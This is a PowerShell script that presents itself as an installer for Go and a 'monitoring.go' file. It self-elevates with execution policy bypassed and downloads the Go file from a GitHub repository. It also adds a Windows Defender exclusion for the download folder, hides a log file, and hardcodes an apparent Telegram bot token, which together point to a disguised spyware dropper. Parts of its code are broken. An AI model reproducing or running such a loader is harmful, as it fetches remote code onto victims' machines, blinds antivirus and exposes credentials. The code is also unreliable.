# secfnx_full_status.ps1
# Fully updated installer/runner for Go + monitoring.go with progress bar, logging, Defender exclusion, and full console status for every action

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [switch]$Auto,
    [switch]$RunHidden
)

# ------------------ Configuration ------------------
$LogFile      = Join-Path $env:TEMP "download_runner.log"
$MsiName      = "go1.25.1.windows-amd64.msi"
$MsiUrl       = "https://go.dev/dl/go1.25.1.windows-amd64.msi"
$Url          = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath    = Join-Path $GoInstallDir "bin"
$GoFileName   = "monitoring.go"
$DestFolder   = Join-Path $env:USERPROFILE "Downloads\secfnx"
$GoFilePath   = Join-Path $DestFolder $GoFileName
$PathLog      = Join-Path $DestFolder "path_sec.log"
$LogMaxSize   = 10MB

# ------------------ Helpers ------------------
function Log { param($Message); $Line="$(Get-Date -Format o) - $Message"; Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue; Write-Output $Line }
function Log-Path { param($Path,$Type); $Line="$(Get-Date -Format o) - ${Type}: $Path"; Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue }
function Test-IsAdmin { try { return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { return $false } }

function Status-Output($Message, $Success) { if ($Success) { Write-Host "`n[✓] $Message: Done" } else { Write-Host "`n[✗] $Message: Failed" } }

# Download file with progress
function Download-File($SourceUrl, $OutPath) {
    try {
        Log "Downloading $SourceUrl -> $OutPath"
        $Response = Invoke-WebRequest -Uri $SourceUrl -UseBasicParsing -Method Get -ErrorAction Stop
        $TotalBytes = $Response.RawContentLength
        $Stream = [System.IO.File]::Create($OutPath)
        $Buffer = New-Object byte[] 8192
        $Downloaded = 0
        $ResponseStream = $Response.Content.ReadAsStream()
        while (($Read = $ResponseStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
            $Stream.Write($Buffer, 0, $Read)
            $Downloaded += $Read
            if ($TotalBytes -gt 0) {
                $Percent=[math]::Round(($Downloaded/$TotalBytes)*100,2)
                Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Status "$Percent% complete" -PercentComplete $Percent
            }
        }
        $Stream.Close(); $ResponseStream.Close(); Write-Progress -Activity "Downloading $(Split-Path $OutPath -Leaf)" -Completed
        Log "Downloaded successfully: $OutPath"; Log-Path $OutPath "File Downloaded"; return $true
    } catch { Log "Download failed: $_"; return $false }
}

# Install Go
function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) { Status-Output "Go already installed" $true; return $true }
    if (-not (Test-IsAdmin)) { Status-Output "Go installation" $false; Write-Host "Error: Run as Administrator"; return $false }
    if (-not (Test-Path $MsiPath)) {
        $result = Download-File $MsiUrl $MsiPath
        Status-Output "Go File Downloading" $result
        if (-not $result) { return $false }
    } else { Status-Output "Go File Already Exists" $true }

    try {
        Log "Running Go MSI installer"; $Args="/i `"$MsiPath`""
        $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru
        if ($Proc.ExitCode -ne 0) { Status-Output "Go Installation" $false; return $false }
        Add-ToSystemPath $GoBinPath | Out-Null; [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Status-Output "Go Installation" $true; return $true
    } catch { Status-Output "Go Installation" $false; return $false }
}

# Defender exclusion
function Add-DefenderExclusion($Path) { try { Add-MpPreference -ExclusionPath $Path -ErrorAction Stop; Status-Output "Defender Exclusion" $true; return $true } catch { Status-Output "Defender Exclusion" $false; return $false } }

# ------------------ Main ------------------
if (-not (Test-IsAdmin)) { Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSCommandPath`""; exit }
if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Log-Path $DestFolder "Folder Created"; Status-Output "Create Destination Folder" $true }
if (-not (Test-Path $PathLog)) { New-Item -Path $PathLog -ItemType File -Force | Out-Null; Set-ItemProperty -Path $PathLog -Name Attributes -Value 'Hidden'; Status-Output "Create Path Log" $true }

if ($Url -match "github.com/.+/blob/.+") { $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"; Status-Output "Convert Blob URL to Raw" $true }
if (Test-Path $GoFilePath) { Remove-Item $GoFilePath -Force; Log-Path $GoFilePath "File Deleted"; Status-Output "Remove Existing Go Script" $true }
$result = Download-File $Url $GoFilePath; Status-Output "Go File Downloading" $result; if (-not $result) { exit 1 }

$result = Install-Go; if (-not $result) { exit 1 }
Add-DefenderExclusion $DestFolder | Out-Null

Status-Output "Script Completed" $true
